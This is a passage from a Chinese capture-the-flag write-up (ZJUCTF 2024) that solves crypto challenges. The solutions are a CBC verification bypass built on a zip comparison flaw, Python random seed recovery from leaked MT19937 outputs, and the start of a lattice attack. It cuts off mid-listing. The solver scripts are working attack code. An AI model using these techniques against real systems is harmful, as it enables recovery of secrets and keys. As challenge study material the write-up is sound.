<li>乍一看这一道CBC填充漏洞题无从下手，前两个选项返回AES加密的flag和hash加密的flag，第三个选项进行verify，但是关键在于比对时它用了zip： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">msg = <span class="hljs-variable language_">self</span>.decrypt(ct, iv)<br><span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(<span class="hljs-variable language_">self</span>.flag, msg):<br>    <span class="hljs-keyword">if</span>(a != b):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Invaild!&quot;</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Valid!&quot;</span><br></code></pre></td></tr></table></figure></li>
<li>zip是逐个字符比对，那就可以设计最后一位pad，使得msg为空，那么就会verify返回valid。flag总长度为64-80，只要判断构造最后一位范围是80-256或0都能使msg为空，从而得到valid： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">getvalue16</span>(<span class="hljs-params">block,possiblevalue,lastblock</span>):<br>    tmp = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        test = <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">63</span>+<span class="hljs-built_in">bytes</span>([i])+block<br>        <span class="hljs-keyword">if</span> verify(test):<br>            tmp.append(i)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> possiblevalue:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> tmp:<br>            <span class="hljs-keyword">if</span> <span class="hljs-number">0</span>&lt;i^lastblock[-<span class="hljs-number">1</span>]^j&lt;<span class="hljs-number">80</span>:<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> i<br></code></pre></td></tr></table></figure></li>
<li>得到最后一位解密数据就可以随心所欲控制msg长度了，再根据已知flag的开头是ZJUCTF{ 和 末尾是 } 加上4个padding，就可以获得每一个块的 0-6 和 11-15 位置上数据: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_head16_iv</span>(<span class="hljs-params">block</span>):<br>    tmp = <span class="hljs-string">b&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tqdm(<span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)):<br>        test = block+<span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">47</span>+<span class="hljs-built_in">bytes</span>([decryptlast^(<span class="hljs-number">79</span>-i)])+E5<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>            iv = tmp+<span class="hljs-built_in">bytes</span>([j])+<span class="hljs-string">b&quot;\x00&quot;</span>*(<span class="hljs-number">15</span>-<span class="hljs-built_in">len</span>(tmp))<br>            <span class="hljs-comment"># print(iv)</span><br>            <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(iv)==<span class="hljs-number">16</span><br>            <span class="hljs-keyword">if</span> verify(test,iv):<br>                tmp+=<span class="hljs-built_in">bytes</span>([j])<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            exit()<br>    <span class="hljs-keyword">return</span> tmp<br><br>IV = get_head16_iv(E1)<br><span class="hljs-keyword">assert</span> verify(aes_flag,IV)==<span class="hljs-number">1</span><br>E2_iv = get_head16_iv(E2)<br>E3_iv = get_head16_iv(E3)<br>E4_iv = get_head16_iv(E4)<br>E5_iv = get_head16_iv(E5)<br>flaglis = [<span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag]<br>knownhead = <span class="hljs-string">b&quot;ZJUCTF&#123;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    flaglis[<span class="hljs-number">16</span>+i] = E1[i]^knownhead[i]^E2_iv[i]<br>    flaglis[<span class="hljs-number">32</span>+i] = E2[i]^knownhead[i]^E3_iv[i]<br>    flaglis[<span class="hljs-number">48</span>+i] = E3[i]^knownhead[i]^E4_iv[i]<br>    flaglis[<span class="hljs-number">64</span>+i] = E4[i]^knownhead[i]^E5_iv[i]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flaglis]))<br>knowntail = <span class="hljs-string">b&quot;&#125;&quot;</span>+<span class="hljs-built_in">bytes</span>([last])*last<br>head_t5 = <span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    head_t5+=<span class="hljs-built_in">bytes</span>([E5_iv[i+<span class="hljs-number">11</span>]^knowntail[i]^E4[i+<span class="hljs-number">11</span>]])<br>    flaglis[i+<span class="hljs-number">11</span>]=E5_iv[i+<span class="hljs-number">11</span>]^knowntail[i]^E4[i+<span class="hljs-number">11</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flaglis]))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>,<span class="hljs-number">16</span>):<br>    flaglis[<span class="hljs-number">16</span>+i] = E1[i]^head_t5[i-<span class="hljs-number">11</span>]^E2_iv[i]<br>    flaglis[<span class="hljs-number">32</span>+i] = E2[i]^head_t5[i-<span class="hljs-number">11</span>]^E3_iv[i]<br>    flaglis[<span class="hljs-number">48</span>+i] = E3[i]^head_t5[i-<span class="hljs-number">11</span>]^E4_iv[i]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flaglis]))<br></code></pre></td></tr></table></figure></li>
<li>但是每个块的中间4个数据是不知道的，且决定于第一个块的中间4个数据，毕竟给了hash，爆破一下就出来了: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">combinations = itertools.product(<span class="hljs-string">&quot;0123456789abcdef&quot;</span>, repeat=<span class="hljs-number">4</span>)<br><span class="hljs-keyword">for</span> combo <span class="hljs-keyword">in</span> combinations:<br>    head_i4 = <span class="hljs-string">&quot;&quot;</span>.join(combo)<br>    tmp = flaglis.copy()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>,<span class="hljs-number">11</span>):<br>        tmp[i] = <span class="hljs-built_in">ord</span>(head_i4[i-<span class="hljs-number">7</span>])<br>        tmp[<span class="hljs-number">16</span>+i] = E1[i]^<span class="hljs-built_in">ord</span>(head_i4[i-<span class="hljs-number">7</span>])^E2_iv[i]<br>        tmp[<span class="hljs-number">32</span>+i] = E2[i]^<span class="hljs-built_in">ord</span>(head_i4[i-<span class="hljs-number">7</span>])^E3_iv[i]<br>        tmp[<span class="hljs-number">48</span>+i] = E3[i]^<span class="hljs-built_in">ord</span>(head_i4[i-<span class="hljs-number">7</span>])^E4_iv[i]<br>        tmp[<span class="hljs-number">64</span>+i] = E4[i]^<span class="hljs-built_in">ord</span>(head_i4[i-<span class="hljs-number">7</span>])^E5_iv[i]<br>    test = <span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tmp])<br>    <span class="hljs-keyword">if</span> sha256(test.encode()).hexdigest()==hash_flag:<br>        <span class="hljs-built_in">print</span>(test)<br>        <span class="hljs-keyword">break</span><br>io.interactive()<br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/27.png" srcset="/img/loading.gif" lazyload></li>
<li>解这种CBC填充题目还是很爽的😛</li>
</ul>
<h2 id="seed">seed</h2>
<ul>
<li>这是一道逆向python的random种子初始化state的题目，题目给了 random 的前 624 个 32 位的数据，可以根据这个逆向出random在该seed下的state，用RandCrack库就行，然后根据<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/205861#h2-5">博客</a>逆向旋转得到最初的state，state的第0个会不一样，不过无伤大雅： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> Random<br><span class="hljs-keyword">from</span> randcrack <span class="hljs-keyword">import</span> RandCrack<br><span class="hljs-keyword">import</span> os<br><br>secret = os.urandom(<span class="hljs-number">16</span>)<br>test = Random()<br>test.seed(secret)<br><br>rc = RandCrack()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">624</span>):<br>    rc.submit(test.getrandbits(<span class="hljs-number">32</span>))<br><span class="hljs-keyword">assert</span> test.getrandbits(<span class="hljs-number">32</span>)==rc.predict_getrandbits(<span class="hljs-number">32</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">backtrace</span>(<span class="hljs-params">cur</span>):<br>    high = <span class="hljs-number">0x80000000</span><br>    low = <span class="hljs-number">0x7fffffff</span><br>    mask = <span class="hljs-number">0x9908b0df</span><br>    state = cur<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">623</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        tmp = state[i]^state[(i+<span class="hljs-number">397</span>)%<span class="hljs-number">624</span>]<br>        <span class="hljs-keyword">if</span> tmp &amp; high == high:<br>            tmp ^= mask<br>            tmp &lt;&lt;= <span class="hljs-number">1</span><br>            tmp |= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            tmp &lt;&lt;=<span class="hljs-number">1</span><br>        res = tmp&amp;high<br>        tmp = state[i-<span class="hljs-number">1</span>]^state[(i+<span class="hljs-number">396</span>)%<span class="hljs-number">624</span>]<br>        <span class="hljs-keyword">if</span> tmp &amp; high == high:<br>            tmp ^= mask<br>            tmp &lt;&lt;= <span class="hljs-number">1</span><br>            tmp |= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            tmp &lt;&lt;=<span class="hljs-number">1</span><br>        res |= (tmp)&amp;low<br>        state[i] = res    <br>    <span class="hljs-keyword">return</span> state<br><br>nowstate = [<span class="hljs-built_in">int</span>(<span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">str</span>(p) <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> z]),<span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> rc.mt]<br>inistate = backtrace(backtrace(nowstate))<br><span class="hljs-comment"># print(inistate)</span><br><br>test = Random()<br>test.seed(secret)<br><span class="hljs-keyword">assert</span> test.getstate()[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>]==<span class="hljs-built_in">tuple</span>(inistate[<span class="hljs-number">1</span>:])<br></code></pre></td></tr></table></figure></li>
<li>接下来要根据state逆向seed，但是python用seed初始化state并不等同于MT19937生成的方法，只好去寻找python用seed初始化state的源代码，然后根据这个一步步逆向得到seed，发现python会将seed转成key数组去影响state生成，<a target="_blank" rel="noopener" href="https://stackered.com/blog/python-random-prediction/">博客</a>中有seed转keylist相关信息，<a target="_blank" rel="noopener" href="https://github.com/python/cpython/blob/main/Modules/_randommodule.c">github</a>上有keylist得到state的过程: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># only reverse for len(keylist)&lt;=624</span><br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long,long_to_bytes<br>N = <span class="hljs-number">624</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_int32</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(<span class="hljs-number">0xFFFFFFFF</span> &amp; x)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">geninit</span>(<span class="hljs-params">seed</span>):<br>    mt = [<span class="hljs-number">0</span>] * N<br>    mt[<span class="hljs-number">0</span>] = seed<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, N):<br>        mt[i] = _int32(<span class="hljs-number">1812433253</span> * (mt[i - <span class="hljs-number">1</span>] ^ mt[i - <span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">30</span>) + i)<br>    <span class="hljs-keyword">return</span> mt<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">init</span>(<span class="hljs-params">key</span>):  <span class="hljs-comment"># len(keylist)&lt;=624</span><br>    mt = geninit(<span class="hljs-number">19650218</span>)<br>    i,j = <span class="hljs-number">1</span>,<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N):<br>        mt[i] = _int32((mt[i] ^ ((mt[i-<span class="hljs-number">1</span>] ^ (mt[i-<span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">30</span>)) * <span class="hljs-number">1664525</span>))+ key[j] + j)<br>        i = i+<span class="hljs-number">1</span><br>        j = (j+<span class="hljs-number">1</span>)%<span class="hljs-built_in">len</span>(key)<br>        <span class="hljs-keyword">if</span> (i&gt;=N):<br>            mt[<span class="hljs-number">0</span>]=mt[-<span class="hljs-number">1</span>]<br>            i=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N-<span class="hljs-number">1</span>):<br>        mt[i] = _int32((mt[i] ^ ((mt[i-<span class="hljs-number">1</span>] ^ (mt[i-<span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">30</span>)) * <span class="hljs-number">1566083941</span>)) - i)<br>        i = i+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> (i&gt;=N):<br>            mt[<span class="hljs-number">0</span>]=mt[-<span class="hljs-number">1</span>]<br>            i=<span class="hljs-number">1</span> <br>    mt[<span class="hljs-number">0</span>] = <span class="hljs-number">0x80000000</span><br>    <span class="hljs-keyword">return</span> mt<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reverseinit</span>(<span class="hljs-params">mt</span>):  <span class="hljs-comment"># len(keylist)&lt;=624</span><br>    mt = <span class="hljs-built_in">list</span>(mt)<br>    temp = _int32((mt[-<span class="hljs-number">1</span>]^(mt[-<span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">30</span>)) * <span class="hljs-number">1566083941</span>)<br>    mt[<span class="hljs-number">1</span>] = _int32(mt[<span class="hljs-number">1</span>]+<span class="hljs-number">1</span>)^temp<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">623</span>,<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        temp = _int32((mt[i-<span class="hljs-number">1</span>]^(mt[i-<span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">30</span>)) * <span class="hljs-number">1566083941</span>)<br>        mt[i] = _int32(mt[i]+i)^temp<br>    key = [-<span class="hljs-number">1</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">624</span>)]  <span class="hljs-comment"># the key on index 0 and 1 and 623 can not be reversed</span><br>    mt2 = geninit(<span class="hljs-number">19650218</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">623</span>,<span class="hljs-number">2</span>,-<span class="hljs-number">1</span>):<br>        temp = _int32(mt2[i]^((mt[i-<span class="hljs-number">1</span>]^(mt[i-<span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">30</span>)) * <span class="hljs-number">1664525</span>))<br>        key[i-<span class="hljs-number">1</span>] = (mt[i]-temp)%(<span class="hljs-number">2</span>**<span class="hljs-number">32</span>)<br>    <span class="hljs-comment"># print(key)  # now key stores the key[j] + j</span><br>    <span class="hljs-comment"># guess the term of the key,it will fails when 621&lt;=len(keylist)&lt;=624</span><br>    <span class="hljs-comment"># i only use simple check for the term,since it is almost impossible to have the same value in a keylist</span><br>    term = key.index(key[<span class="hljs-number">2</span>],<span class="hljs-number">3</span>)-<span class="hljs-number">2</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;keylenth:&quot;</span>,term)<br>    keylist = []<br>    <span class="hljs-keyword">if</span> (term&lt;<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> term&gt;<span class="hljs-number">620</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;failed to guess the keylist&quot;</span>)<br>        exit()<br>    <span class="hljs-keyword">elif</span> (term==<span class="hljs-number">1</span>):<br>        keylist.append(key[<span class="hljs-number">2</span>])<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;guess:&quot;</span>,keylist)<br>    <span class="hljs-keyword">elif</span> (term==<span class="hljs-number">2</span>):<br>        keylist.append(key[<span class="hljs-number">2</span>])<br>        keylist.append(key[<span class="hljs-number">3</span>]-<span class="hljs-number">1</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;guess:&quot;</span>,keylist)<br>    <span class="hljs-keyword">else</span>:<br>        keylist.append(key[key.index(key[<span class="hljs-number">2</span>],<span class="hljs-number">3</span>)-<span class="hljs-number">2</span>])<br>        keylist.append(key[key.index(key[<span class="hljs-number">2</span>],<span class="hljs-number">3</span>)-<span class="hljs-number">1</span>]-<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(term-<span class="hljs-number">2</span>):<br>            keylist.append(key[<span class="hljs-number">2</span>+i]-<span class="hljs-number">2</span>-i)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;guess:&quot;</span>,keylist)<br>    seed = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(keylist)):<br>        seed += keylist[i] &lt;&lt; (<span class="hljs-number">32</span>*i)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;seed in number mode:&quot;</span>,seed)<br>    <span class="hljs-keyword">return</span> seed<br><br>reverseinit(init([<span class="hljs-number">1701601646</span>,<span class="hljs-number">1</span>]))<br>random.seed(<span class="hljs-number">214097309740939471387164918734691</span>)<br>reverseinit(random.getstate()[<span class="hljs-number">1</span>][:-<span class="hljs-number">1</span>])<br><br>random.seed(<span class="hljs-string">&quot;my seed&quot;</span>)<br>reverseinit(random.getstate()[<span class="hljs-number">1</span>][:-<span class="hljs-number">1</span>])<br><span class="hljs-comment"># key = [3358881470, 2670804673, 4256210531, 4085415016, 2014628229, 2984896648, 2837766904, 534869515, 3396683863, 1732457832, 679200103, 2879791640, 4054140216, 3129555524, 1092970275, 3225866273, 1936024932, 7174432]</span><br>random.seed(<span class="hljs-string">b&#x27;ZJUCTF&#123;&#x27;</span>+<span class="hljs-string">b&quot;*&quot;</span>*<span class="hljs-number">72</span>+<span class="hljs-string">b&#x27;&#125;&#x27;</span>)<br><span class="hljs-built_in">print</span>(long_to_bytes(reverseinit(random.getstate()[<span class="hljs-number">1</span>][:-<span class="hljs-number">1</span>])))<br></code></pre></td></tr></table></figure></li>
<li>用fakeflag测试了下，发现可以，那就把题目中的文件随机数导入即可（注意如果用bytes array初始化那么keylist还要加上hash值）: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> randcrack <span class="hljs-keyword">import</span> RandCrack<br><br>rc = RandCrack()<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./seed/leak&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f.readlines():<br>    rc.submit(<span class="hljs-built_in">int</span>(i[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>))<br>nowstate = [<span class="hljs-built_in">int</span>(<span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">str</span>(p) <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> z]),<span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> rc.mt]<br>inistate = backtrace(backtrace(nowstate))<br><span class="hljs-built_in">print</span>(long_to_bytes(reverseinit(inistate)))<br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/28.png" srcset="/img/loading.gif" lazyload> <div class="note note-info">
            <p>网上好像有现成破解seed的代码。。。</p>
          </div></li>
</ul>
<h2 id="nsa">NSA</h2>
<ul>
<li><p>知道格基规约就能把这道题秒了，由于x和a的大小相差很大，那么就可以构造矩阵(记原<span class="math inline">\(s\ //\ n=t\)</span>): <span class="math display">\[
  \begin{bmatrix}
  x_1 &amp; x_2 &amp; x_3 &amp; x_4 &amp; x_5 &amp; t &amp; 1
  \end{bmatrix}
  \times
  \begin{bmatrix}
  1 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; a_1 \\
  0 &amp; 1 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; a_2 \\
  0 &amp; 0 &amp; 1 &amp; 0 &amp; 0 &amp; 0 &amp; a_3 \\
  0 &amp; 0 &amp; 0 &amp; 1 &amp; 0 &amp; 0 &amp; a_4 \\
  0 &amp; 0 &amp; 0 &amp; 0 &amp; 1 &amp; 0 &amp; a_5 \\
  0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 1 &amp; -n \\
  0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; -s
  \end{bmatrix}
  \]</span></p></li>
<li><p>得到结果： <span class="math display">\[
  \begin{bmatrix}
  x_1 &amp; x_2 &amp; x_3 &amp; x_4 &amp; x_5 &amp; t &amp; 0
  \end{bmatrix}
  \]</span></p></li>
<li><p>由于结果的长度远小于矩阵中a,n,s的长度，直接对该矩阵进行格基规约，那么结果就可能是处理后矩阵的某一行: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> secrets <span class="hljs-keyword">import</span> randbits<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br>n = <span class="hljs-number">1973262420438951967320857357182009152091259685060976722964606060415762941212963496173787803818132496094383083809617106382186584091024192880722074907992491367450376544013030959022137871119305973124950248142047263035635704712183940295643931582521870194436601800272104155213299635342758552485316790832579867297150676449480377301711550092169821139312777545087931190076223860806667206368445038374040009303216695843074552565472224259513347471048389711982387187929358080134259118116803904926037703226659436288017803262824150053323837281123708147514697839476472493444001359537263470035147822515533236213306871187789861137864</span><br>s = <span class="hljs-number">25968545790292770927664439022039737990740822274703473845844930805491973210053546757650612526671426169052862599487679523347480169973953855077248798990354540626902441004340668118824647635652733202266038565469480686593639141386160897997041025319530312635817177211940935304195338733597108954253489362890509953008579795465614477856365008523630015461376982331314525043834068281293242866988185504701331075706296655857609737273305897051800777391003779592347329297992465517975455425494933095449106283240537673407217335317072671448690092359553841225872584507479466178655269973803840975113771278026055850135141677845388049546</span><br>a = [<span class="hljs-number">10408175307348227837634927663895071529476747502502185137513974921146145423682039533172426778936636358324323912788471069026035168778419976679080184413445271720845102618347963190848191065559646770751655277489531629085722243398071815514153232748524230263971369717467799896204740816910663354935597598214850905156314156887989538373959310497944747453576532357871371863075761014213384743918508858141163976218524522607305196842635916581744439316075721739180965470299311350393451063367829414121337156065063861518282124855164605728530156876267682012313606474074632758901489079434948149811390226852506471410549293073583094154314</span>, <span 